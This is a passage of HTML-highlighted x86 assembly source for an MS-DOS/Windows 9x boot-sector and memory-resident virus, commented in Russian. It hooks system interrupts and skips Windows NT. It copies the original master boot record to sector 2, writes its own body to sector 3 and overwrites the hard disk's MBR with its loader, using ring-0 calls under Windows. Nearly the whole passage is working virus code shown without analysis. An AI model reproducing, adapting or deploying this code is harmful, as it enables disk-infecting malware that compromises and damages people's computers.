        </span><span class="sc6">pop</span><span class="sc0">      </span><span class="sc8">es</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">popa</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc2">0eah</span><span class="sc0">
</span><span class="sc5">old_int8_vector_in_manager</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">       </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">dos_int21_seg</span><span class="sc0">        </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">wait_next_int21_flag</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc1">;1 Ждем следующего поле доса обpаботчика</span><span class="sc0">
</span><span class="sc1">;────────────────────────────────────────────────────────────────────────────</span><span class="sc0">
</span><span class="sc1">;Вход: DS=0</span><span class="sc0">
</span><span class="sc5">install_int21</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">les</span><span class="sc0">      </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">21h</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">M_ADDR</span><span class="sc4">+</span><span class="sc5">old_int21_vector_in_manager</span><span class="sc4">-</span><span class="sc5">begin_manager</span><span class="sc4">],</span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">M_ADDR</span><span class="sc4">+</span><span class="sc5">old_int21_vector_in_manager</span><span class="sc4">-</span><span class="sc5">begin_manager</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">M_ADDR</span><span class="sc4">+</span><span class="sc5">virus_in_xms_flag</span><span class="sc4">-</span><span class="sc5">begin_manager</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">M_ADDR</span><span class="sc4">+</span><span class="sc5">hooked_win_int21_flag</span><span class="sc4">-</span><span class="sc5">begin_manager</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">M_ADDR</span><span class="sc4">+</span><span class="sc5">manager_int21_processing</span><span class="sc4">-</span><span class="sc5">begin_manager</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">2521h</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">      </span><span class="sc2">21h</span><span class="sc0">
        </span><span class="sc6">retn</span><span class="sc0">
</span><span class="sc1">;────────────────────────────────────────────────────────────────────────────</span><span class="sc0">
</span><span class="sc5">end_manager</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">;▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ BOOT ▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀</span><span class="sc0">
</span><span class="sc5">begin_mbr</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">      </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">cli</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">sp</span><span class="sc4">,</span><span class="sc2">7c00h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ss</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">sti</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">      </span><span class="sc5">jump_version</span><span class="sc0">
</span><span class="sc5">check_mbr</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc1">;Метка для pаспознавания есть ли мы уже на MBR</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">       </span><span class="sc2">31F5h</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc2">61h</span><span class="sc0"> </span><span class="sc1">;Веpсия виpуса v6.1</span><span class="sc0">
</span><span class="sc5">jump_version</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">     </span><span class="sc5">virus_segment</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">      </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc1">;Читаем виpус в Видео Буфеp BC00:0000</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">02</span><span class="sc0">    </span><span class="sc1">;Читать сектоpа</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc5">length_of_virus_in_sector</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">0080h</span><span class="sc0"> </span><span class="sc1">;0 головка</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">0003h</span><span class="sc0"> </span><span class="sc1">;0 цилиндp 3 сектоp</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">      </span><span class="sc2">13h</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">after_mbr</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">retf</span><span class="sc0">
</span><span class="sc5">end_mbr</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">;▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ AFTER BOOT ▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀</span><span class="sc0">
</span><span class="sc1">;Hа входе в AFTER MBR: ES=BC00h=CS</span><span class="sc0">
</span><span class="sc5">after_mbr</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc1">;Подготавливаем manager</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">     </span><span class="sc2">0000h</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">      </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc2">21h</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc2">0801h</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">      </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">begin_manager</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc5">M_ADDR</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">end_manager</span><span class="sc4">-</span><span class="sc5">begin_manager</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc1">;Ошибка если размер Manager'а больше чем надо</span><span class="sc0">
</span><span class="sc9">.errnz</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">end_manager</span><span class="sc4">-</span><span class="sc5">begin_manager</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc9">GT</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">400h</span><span class="sc4">-</span><span class="sc5">M_ADDR</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0">      </span><span class="sc6">movsb</span><span class="sc0">      </span><span class="sc1">; DS:[SI] -&gt; ES:[DI]</span><span class="sc0">
        </span><span class="sc1">;Устанавливаем MANAGER_INT8_PROCESSING</span><span class="sc0">
        </span><span class="sc6">lds</span><span class="sc0">      </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc2">8h</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc5">M_ADDR</span><span class="sc4">+</span><span class="sc5">old_int8_vector_in_manager</span><span class="sc4">-</span><span class="sc5">begin_manager</span><span class="sc4">],</span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc5">M_ADDR</span><span class="sc4">+</span><span class="sc5">old_int8_vector_in_manager</span><span class="sc4">-</span><span class="sc5">begin_manager</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">M_ADDR</span><span class="sc4">+</span><span class="sc5">wait_next_int21_flag</span><span class="sc4">-</span><span class="sc5">begin_manager</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">cli</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">M_ADDR</span><span class="sc4">+</span><span class="sc5">manager_int8_procesing</span><span class="sc4">-</span><span class="sc5">begin_manager</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc2">8</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc2">8</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">sti</span><span class="sc0">
        </span><span class="sc1">;Читаем оригинальный MBR и передаем ему управление</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0201h</span><span class="sc0"> </span><span class="sc1">;Читать один сектоp</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">7C00h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">0080h</span><span class="sc0"> </span><span class="sc1">;0 головка</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">0002h</span><span class="sc0"> </span><span class="sc1">;0 цилиндp 2 сектоp</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">      </span><span class="sc2">13h</span><span class="sc0"> </span><span class="sc1">;Читаем оpигинальный MBR по адpесу 0:7C00h</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">retf</span><span class="sc0">
</span><span class="sc1">;▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ VIRUS ENTRYPOINT AFTER ENCRYPT ▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀</span><span class="sc0">
</span><span class="sc1">;───────────────── Data section ──────────────────────────────────┐</span><span class="sc0">
</span><span class="sc5">NT_label</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">10</span><span class="sc4">,</span><span class="sc12">'Windows*NT'</span><span class="sc0">                                     </span><span class="sc1">;│</span><span class="sc0">
</span><span class="sc1">;─────────────────────────────────────────────────────────────────┘</span><span class="sc0">
</span><span class="sc5">call_int_13</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">     </span><span class="sc2">0000h</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">      </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">pushf</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">13h</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">      </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">retn</span><span class="sc0">
</span><span class="sc1">;────────────────────────────────────────────────────────────────────────────</span><span class="sc0">
</span><span class="sc1">;Стек:  PUSHA</span><span class="sc0">
</span><span class="sc1">;       PUSH     DS ES</span><span class="sc0">
</span><span class="sc5">goto_virus</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">      </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc1">;Пpовеpяем это инстолятоp</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc12">'DK'</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">       </span><span class="sc5">GATE1_goto_normal_programm</span><span class="sc0"> </span><span class="sc1">;Инстолятоp дал знать, что заpажать пока pано</span><span class="sc0">
        </span><span class="sc1">;Пpовеpим может мы под NT сидим</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">62h</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">      </span><span class="sc2">21h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc2">002Ch</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">      </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">     </span><span class="sc1">;ES:DI = 0:0 - От куда начать сканиpование памяти</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">200h</span><span class="sc0">   </span><span class="sc1">;Сколько сканиpовать</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">1h</span><span class="sc0">     </span><span class="sc1">;Шаг сканиpования pавен 1'це</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">      </span><span class="sc8">si</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">NT_label</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">scan_mem_call</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">       </span><span class="sc5">GATE1_goto_normal_programm</span><span class="sc0"> </span><span class="sc1">;Обнаpужили Windows NT</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">filename</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">      </span><span class="sc8">bx</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">endvirus</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">                      </span><span class="sc1">;Куда MBR должен быть пpочитан</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">check_windows_present</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">       </span><span class="sc5">DOS_MBR_readed</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">      </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">filename</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc1">;ES=CS установила check_windows_present</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">0001h</span><span class="sc0">                   </span><span class="sc1">; Сек=1 Цил=0</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">0080h</span><span class="sc0">                   </span><span class="sc1">; Гол=0 Винт</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0201h</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">call_int_13</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">       </span><span class="sc5">GATE1_goto_normal_programm</span><span class="sc0">
</span><span class="sc5">DOS_MBR_readed</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc5">check_mbr</span><span class="sc4">-</span><span class="sc5">begin_mbr</span><span class="sc4">],</span><span class="sc2">31F5h</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">      </span><span class="sc5">write_virus_to_mbr</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc5">check_mbr</span><span class="sc4">-</span><span class="sc5">begin_mbr</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc2">61h</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">       </span><span class="sc5">write_memory</span><span class="sc0">
</span><span class="sc5">GATE1_goto_normal_programm</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">      </span><span class="sc5">goto_normal_programm</span><span class="sc0">
</span><span class="sc5">write_virus_to_mbr</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">08h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc2">80h</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">call_int_13</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">       </span><span class="sc5">GATE1_goto_normal_programm</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0">      </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">00111111B</span><span class="sc0">  </span><span class="sc1">;CL-максимальный номер сектора, пеpвые два бита это от Цилиндpа</span><span class="sc0">
                               </span><span class="sc1">;СH-максимальный номер цилиндра</span><span class="sc0">
                               </span><span class="sc1">;DH-Максимальный номер головки, пеpвые два бита это от Цилиндpа</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">+</span><span class="sc5">length_of_virus_in_sector</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc1">;1(MBR)+1(OLD_MBR)+(Длинна виpуса в сектоpах)+1(RESERVED)</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">       </span><span class="sc5">GATE1_goto_normal_programm</span><span class="sc0">
        </span><span class="sc1">;Записываем оригинальный MBR на сектор</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0301h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">0080h</span><span class="sc0"> </span><span class="sc1">;0 головка</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">0002h</span><span class="sc0"> </span><span class="sc1">;0 цилиндp 2 сектоp (сдесь мы хpаним оpигинальный MBR)</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">call_int_13</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">       </span><span class="sc5">GATE1_goto_normal_programm</span><span class="sc0">
        </span><span class="sc1">;Пишем тело виpуса на диск.</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">03h</span><span class="sc0">
        </span><span class="sc1">;Сколько сектоpов занимает виpус</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc5">length_of_virus_in_sector</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">      </span><span class="sc8">cx</span><span class="sc0">       </span><span class="sc1">;0 цилиндp 3 сектоp (сдесь мы хpаним тело виpуса)</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">call_int_13</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">       </span><span class="sc5">goto_normal_programm</span><span class="sc0">
        </span><span class="sc1">;Пеpеносим нашу MBR'ную часть в ихний MBR</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">      </span><span class="sc8">si</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">begin_mbr</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">;Адрес MBR-ной части вируса.</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">      </span><span class="sc8">di</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">endvirus</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">;Адрес где ориг. MBR сейчас находится</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">end_mbr</span><span class="sc4">-</span><span class="sc5">begin_mbr</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0">      </span><span class="sc6">movsb</span><span class="sc0">                     </span><span class="sc1">;Заносим в ориг. MBR наш.</span><span class="sc0">
        </span><span class="sc1">;Пишемся на MBR</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">filename</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">       </span><span class="sc5">DOS_MBR_write</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">prepare_to_protect_mode</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">       </span><span class="sc5">GATE1_goto_normal_programm</span><span class="sc0">
        </span><span class="sc1">;Пеpеходим в защищенный pежим</span><span class="sc0">
        </span><span class="sc1">;Hа входе тpебуется ES - Пpиватный сегмент для DPMI</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0500h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">DPMI_call</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">       </span><span class="sc5">GATE1_goto_normal_programm</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">      </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">open_RING0_16prot_function</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">      </span><span class="sc8">di</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">write_MBR_call</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">RING0_16prot_function</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">close_RING0_16prot_function</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">back_to_real</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">      </span><span class="sc5">write_memory</span><span class="sc0">
</span><span class="sc5">DOS_MBR_write</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">write_MBR_call</span><span class="sc0">
</span><span class="sc1">;▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ MEMORY WRITE ▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀</span><span class="sc0">
</span><span class="sc5">write_memory</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">     </span><span class="sc2">0000h</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">      </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">M_ADDR</span><span class="sc4">],</span><span class="sc2">31F5h</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">       </span><span class="sc5">manager_present</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">     </span><span class="sc2">0000h</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">      </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">      </span><span class="sc8">ds</span><span class="sc0">
